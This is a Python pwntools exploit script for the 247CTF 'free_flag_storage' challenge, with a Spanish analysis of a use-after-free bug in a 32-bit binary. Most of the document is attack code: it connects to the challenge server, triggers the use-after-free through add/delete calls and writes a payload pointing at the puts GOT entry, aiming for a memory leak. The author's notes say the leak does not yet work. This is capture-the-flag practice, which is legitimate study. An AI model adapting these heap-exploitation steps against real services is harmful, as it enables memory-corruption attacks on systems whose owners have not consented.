#!/usr/bin/env python3
"""
UAF Exploit for free_flag_storage
247CTF Challenge

ANÁLISIS:
=========
- Binario: 32-bit, No PIE, Partial RELRO, NX, Canary
- Struct flag (16 bytes): [length:4][value_ptr:4][cid:4][score:4]
- Array flags[3] en 0x804b04c
- Max 3 flags, count en ebx+0x48

VULNERABILIDAD:
===============
- delete() libera memoria pero NO pone puntero a NULL
- Después de delete(0) + add(flag2):
  - flags[0] y flags[1] apuntan al MISMO struct (confirmado: ambos muestran CCCC)

PROBLEMA ACTUAL:
================
- edit() escribe al VALUE BUFFER, no al struct
- Para controlar value_ptr, necesito escribir al struct directamente
- Requiere: overlap de value buffer con struct location (heap feng shui)

TODO:
=====
- Probar diferentes órdenes de delete para crear overlap value<->struct
- O buscar otra vulnerabilidad (overflow en edit?)
"""
from pwn import *

context.binary = elf = ELF('./free_flag_storage')
context.log_level = 'info'

# GOT addresses (No PIE = fixed)
puts_got = 0x804b028
atoi_got = 0x804b034

def start():
    if args.REMOTE:
        return remote('de22d451a7a11cba.247ctf.com', 50413)
    if args.GDB:
        return gdb.debug('./free_flag_storage', '''
            set pagination off
            b *0x8048ca9
            c
        ''')
    return process('./free_flag_storage')

p = start()

def send3(s):
    """Send exactly 3 bytes (value + newlines)"""
    p.send(str(s).encode().ljust(3, b'\n'))

def add(length, value, cid, score):
    p.sendline(b'add')
    p.recvuntil(b'length:'); send3(length)
    p.recvuntil(b'value:'); p.send(value.ljust(length, b'\x00')[:length])
    p.recvuntil(b'challenge_id:'); send3(cid)
    p.recvuntil(b'score:'); send3(score)
    p.recvuntil(b'Enter command:')

def edit(idx, value, length, cid=99, score=99):
    """Edit también pide challenge_id y score!"""
    p.sendline(b'edit')
    p.recvuntil(b'edit:'); send3(idx)
    p.recvuntil(b'):'); p.send(value.ljust(length, b'\x00')[:length])
    p.recvuntil(b'challenge_id:'); send3(cid)
    p.recvuntil(b'score:'); send3(score)
    p.recvuntil(b'Enter command:')

def delete(idx):
    p.sendline(b'delete')
    p.recvuntil(b'delete:'); send3(idx)
    p.recvuntil(b'Enter command:')

def show():
    p.sendline(b'print')
    return p.recvuntil(b'Enter command:', drop=True)

# === EXPLOIT ===
p.recvuntil(b'Enter command:')

log.info("Step 1: Add flag0, flag1")
add(16, b'AAAA'*4, 1, 11)
add(16, b'BBBB'*4, 2, 22)
log.info(show().decode())

log.info("Step 2: Delete flag0")
delete(0)

log.info("Step 3: Add flag2 - triggers UAF overlap")
add(16, b'CCCC'*4, 3, 33)
log.info(show().decode())
# OUTPUT: Ambos flags muestran CCCC - UAF CONFIRMADO!

log.info("Step 4: Edit flag0 (escribe al value buffer compartido)")
payload = p32(16) + p32(puts_got) + p32(0xdead) + p32(0xbeef)
edit(0, payload, 16)

log.info("Step 5: Show result")
data = show()
log.info(f"Result: {data}")

# Nota: El valor ahora empieza con 0x10 (no printable)
# No hay leak porque escribimos al VALUE, no modificamos value_ptr

p.interactive()
